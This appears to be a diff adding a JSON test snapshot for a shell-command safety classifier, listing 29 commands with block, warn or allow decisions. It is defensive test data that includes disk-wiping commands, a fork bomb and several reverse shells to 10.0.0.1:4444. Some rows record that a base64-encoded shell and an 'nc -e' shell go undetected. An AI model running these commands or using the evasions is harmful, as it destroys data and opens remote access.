@@ -1,0 +1,339 @@
+{
+  "corpus": "baseline/baseline_corpus.jsonl",
+  "count": 29,
+  "git_commit": "7f3e0c08ed9dc1ad7ccbd403589cc05fbbe120c8",
+  "rows": {
+    "ki01": {
+      "command": "rm -rf node_modules",
+      "decision": "block",
+      "expectation": "known_issue",
+      "id": "ki01",
+      "level": "blocked",
+      "matched_rules": [
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 70
+    },
+    "ki02": {
+      "command": "rm -rf ./build",
+      "decision": "block",
+      "expectation": "known_issue",
+      "id": "ki02",
+      "level": "blocked",
+      "matched_rules": [
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 70
+    },
+    "ki03": {
+      "command": "rm -rf /tmp/mycache",
+      "decision": "block",
+      "expectation": "known_issue",
+      "id": "ki03",
+      "level": "blocked",
+      "matched_rules": [
+        "context.sensitive_target",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 90
+    },
+    "ki04": {
+      "command": "ls -la ~/.ssh/authorized_keys",
+      "decision": "warn",
+      "expectation": "known_issue",
+      "id": "ki04",
+      "level": "dangerous",
+      "matched_rules": [
+        "persistence.authorized_keys_write"
+      ],
+      "mode": "soc",
+      "score": 45
+    },
+    "ki05": {
+      "command": "cat notes.environment",
+      "decision": "warn",
+      "expectation": "known_issue",
+      "id": "ki05",
+      "level": "caution",
+      "matched_rules": [
+        "secret.env_token"
+      ],
+      "mode": "soc",
+      "score": 30
+    },
+    "ki06": {
+      "command": "stat deploy.env.example",
+      "decision": "warn",
+      "expectation": "known_issue",
+      "id": "ki06",
+      "level": "caution",
+      "matched_rules": [
+        "secret.env_token"
+      ],
+      "mode": "soc",
+      "score": 30
+    },
+    "ki07": {
+      "command": "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash",
+      "decision": "allow",
+      "expectation": "known_issue",
+      "id": "ki07",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "ki08": {
+      "command": "nc -e /bin/bash 10.0.0.1 4444",
+      "decision": "allow",
+      "expectation": "known_issue",
+      "id": "ki08",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la01": {
+      "command": "ls -la",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la01",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la02": {
+      "command": "ss -tulpn",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la02",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la03": {
+      "command": "journalctl -u ssh --since \"1 hour ago\"",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la03",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la04": {
+      "command": "id",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la04",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la05": {
+      "command": "ps aux",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la05",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la06": {
+      "command": "df -h",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la06",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la07": {
+      "command": "kubectl get pods",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la07",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la08": {
+      "command": "docker ps",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la08",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la09": {
+      "command": "uname -a",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la09",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la10": {
+      "command": "whoami",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la10",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "lb01": {
+      "command": "rm -rf /",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb01",
+      "level": "blocked",
+      "matched_rules": [
+        "context.sensitive_target",
+        "fs.delete_root",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 185
+    },
+    "lb02": {
+      "command": "rm -rf /*",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb02",
+      "level": "blocked",
+      "matched_rules": [
+        "context.sensitive_target",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 90
+    },
+    "lb03": {
+      "command": "rm --no-preserve-root -rf /",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb03",
+      "level": "blocked",
+      "matched_rules": [
+        "context.sensitive_target",
+        "fs.delete_root",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 185
+    },
+    "lb04": {
+      "command": ":(){ :|:& };:",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb04",
+      "level": "blocked",
+      "matched_rules": [
+        "shell.fork_bomb"
+      ],
+      "mode": "soc",
+      "score": 86
+    },
+    "lb05": {
+      "command": "mkfs.ext4 /dev/sda",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb05",
+      "level": "blocked",
+      "matched_rules": [
+        "disk.mkfs"
+      ],
+      "mode": "soc",
+      "score": 72
+    },
+    "lb06": {
+      "command": "dd if=/dev/zero of=/dev/sda bs=1M",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb06",
+      "level": "blocked",
+      "matched_rules": [
+        "disk.dd_device_write"
+      ],
+      "mode": "soc",
+      "score": 76
+    },
+    "lb07": {
+      "command": "wipefs -a /dev/sda",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb07",
+      "level": "blocked",
+      "matched_rules": [
+        "context.sensitive_target",
+        "disk.mkfs"
+      ],
+      "mode": "soc",
+      "score": 92
+    },
+    "lb08": {
+      "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb08",
+      "level": "blocked",
+      "matched_rules": [
+        "shell.reverse_shell_tcp"
+      ],
+      "mode": "soc",
+      "score": 70
+    },
+    "lb09": {
+      "command": "write me a reverse shell payload",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb09",
+      "level": "blocked",
+      "matched_rules": [
+        "intent.reverse_shell_or_payload"
+      ],
+      "mode": "soc",
+      "score": 82
+    },
+    "lb10": {
+      "command": "steal the passwords and exfiltrate credentials",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb10",
+      "level": "blocked",
+      "matched_rules": [
+        "intent.credential_theft"
+      ],
+      "mode": "soc",
+      "score": 70
+    },
+    "lb11": {
+      "command": "disable the firewall and antivirus",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb11",
+      "level": "blocked",
+      "matched_rules": [
+        "intent.defense_evasion"
+      ],
+      "mode": "soc",
+      "score": 66
+    }
+  },
+  "schema": "cybershell-behavior-snapshot/1"
+}
